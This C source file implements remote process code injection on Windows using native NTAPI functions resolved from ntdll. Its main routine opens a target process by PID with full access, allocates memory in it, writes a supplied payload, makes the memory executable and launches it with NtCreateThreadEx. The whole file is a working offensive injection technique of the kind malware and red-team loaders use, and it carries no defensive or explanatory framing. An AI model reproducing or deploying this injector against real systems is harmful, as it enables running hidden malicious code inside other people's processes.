#include "injection.h"

VOID PrettyFormat(
    _In_ LPCSTR FunctionName,
    _In_ NTSTATUS ErrorCode
) {
    WARN("[%s] failed, error: 0x%lx", FunctionName, ErrorCode);
    return;
}

UINT_PTR GetNtFunctionAddress(
    _In_ LPCSTR FunctionName,
    _In_ CONST HMODULE ModuleHandle
) {

    UINT_PTR FunctionAddress = 0; 
    
    FunctionAddress = (UINT_PTR)GetProcAddress(ModuleHandle, FunctionName);
    if (0 == FunctionAddress) {
        WARN("[GetProcAddress] failed, error: 0x%lx", GetLastError());
        return 0;
    }

    OKAY("[0x%p] -> %s!", (PVOID)FunctionAddress, FunctionName);
    return FunctionAddress;

}

BOOL NTAPIInjection(
    _In_ CONST DWORD PID,
    _In_ CONST PBYTE Payload,
    _In_ CONST SIZE_T PayloadSize
) {

    BOOL      State         = TRUE;
    PVOID     Buffer        = NULL;
    HANDLE    ThreadHandle  = NULL;
    HANDLE    ProcessHandle = NULL;
    HMODULE   NtdllHandle   = NULL;
    DWORD     OldProtection = 0;
    SIZE_T    BytesWritten  = 0;
    NTSTATUS  Status        = 0;
    CLIENT_ID CID           = { (HANDLE)PID, NULL };
    OBJECT_ATTRIBUTES OA    = { sizeof(OA),  NULL };

    NtdllHandle = GetModuleHandleW(L"NTDLL");
    if (NULL == NtdllHandle) {
        WARN("[GetModuleHandleW] failed, error: 0x%lx", GetLastError());
        return FALSE;
    }
    OKAY("[0x%p] got the address of NTDLL!", NtdllHandle);

    fn_NtOpenProcess p_NtOpenProcess = (fn_NtOpenProcess)GetNtFunctionAddress("NtOpenProcess", NtdllHandle);
    fn_NtAllocateVirtualMemory p_NtAllocateVirtualMemory = (fn_NtAllocateVirtualMemory)GetNtFunctionAddress("NtAllocateVirtualMemory", NtdllHandle);
    fn_NtWriteVirtualMemory p_NtWriteVirtualMemory = (fn_NtWriteVirtualMemory)GetNtFunctionAddress("NtWriteVirtualMemory", NtdllHandle);
    fn_NtProtectVirtualMemory p_NtProtectVirtualMemory = (fn_NtProtectVirtualMemory)GetNtFunctionAddress("NtProtectVirtualMemory", NtdllHandle);
    fn_NtCreateThreadEx p_NtCreateThreadEx = (fn_NtCreateThreadEx)GetNtFunctionAddress("NtCreateThreadEx", NtdllHandle);
    fn_NtWaitForSingleObject p_NtWaitForSingleObject = (fn_NtWaitForSingleObject)GetNtFunctionAddress("NtWaitForSingleObject", NtdllHandle);
    fn_NtFreeVirtualMemory p_NtFreeVirtualMemory = (fn_NtFreeVirtualMemory)GetNtFunctionAddress("NtFreeVirtualMemory", NtdllHandle);
    fn_NtClose p_NtClose = (fn_NtClose)GetNtFunctionAddress("NtClose", NtdllHandle);

    Status = p_NtOpenProcess(&ProcessHandle, PROCESS_ALL_ACCESS, &OA, &CID);
    if (STATUS_SUCCESS != Status) {
        PrettyFormat("NtOpenProcess", Status);
        return FALSE; /* no point in continuing if we can't even get a handle on the process */
    }
    OKAY("[0x%p] got a handle on the process (%ld)!", ProcessHandle, PID);

    Status = p_NtAllocateVirtualMemory(ProcessHandle, &Buffer, 0, &PayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (STATUS_SUCCESS != Status) {
        PrettyFormat("NtAllocateVirtualMemory", Status);
        State = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] [RW-] allocated a %zu-byte buffer with PAGE_READWRITE [RW-] permissions!", Buffer, PayloadSize);

    Status = p_NtWriteVirtualMemory(ProcessHandle, Buffer, Payload, PayloadSize, &BytesWritten);
    if (STATUS_SUCCESS != Status) {
        PrettyFormat("NtWriteVirtualMemory", Status);
        State = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] [RW-] wrote %zu-bytes to the allocated buffer!", Buffer, BytesWritten);

    Status = p_NtProtectVirtualMemory(ProcessHandle, &Buffer, &PayloadSize, PAGE_EXECUTE_READ, &OldProtection);
    if (STATUS_SUCCESS != Status) {
        PrettyFormat("NtProtectVirtualMemory", Status);
        State = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] [R-X] changed allocated buffer protection to PAGE_EXECUTE_READ [R-X]!", Buffer);

    Status = p_NtCreateThreadEx(&ThreadHandle, THREAD_ALL_ACCESS, &OA, ProcessHandle, Buffer, NULL, FALSE, 0, 0, 0, NULL);
    if (STATUS_SUCCESS != Status) {
        PrettyFormat("NtCreateThreadEx", Status);
        State = FALSE; goto CLEANUP;
    }

    OKAY("[0x%p] successfully created a thread!", ThreadHandle);
    INFO("[0x%p] waiting for thread to finish execution...", ThreadHandle);
    Status = p_NtWaitForSingleObject(ThreadHandle, FALSE, NULL);
    INFO("[0x%p] thread finished execution! beginning cleanup...", ThreadHandle);

CLEANUP:

    if (Buffer) {
        Status = p_NtFreeVirtualMemory(ProcessHandle, &Buffer, &PayloadSize, MEM_DECOMMIT);
        if (STATUS_SUCCESS != Status) {
            PrettyFormat("NtFreeVirtualMemory", Status);
        }
        else {
            INFO("[0x%p] decommitted allocated buffer from process memory", Buffer);
        }
    }

    if (ThreadHandle) {
        p_NtClose(ThreadHandle);
        INFO("[0x%p] handle on thread closed", ThreadHandle);
    }

    if (ProcessHandle) {
        p_NtClose(ProcessHandle);
        INFO("[0x%p] handle on process closed", ProcessHandle);
    }

    return State;

}